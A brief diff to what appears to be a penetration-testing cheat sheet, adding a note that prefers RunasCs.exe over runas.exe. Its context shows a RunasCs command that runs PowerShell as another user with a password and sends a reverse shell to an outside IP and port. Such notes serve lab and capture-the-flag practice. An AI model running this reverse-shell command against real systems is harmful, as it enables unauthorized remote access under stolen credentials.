@@ -215,6 +215,7 @@ net accounts
 ```
 ## RunAsCs - runas user
 ```
+# Prefer RunasCs.exe rather than runas.exe. The latter often fails silently w/ explaination.
 # run as <USER>, useful if the user is not in the REMOTE GROUP
 # upload RunasCs
 .\RunasCs.exe <USER> <PASSWORD>  powershell.exe -r 10.10.14.84:6666
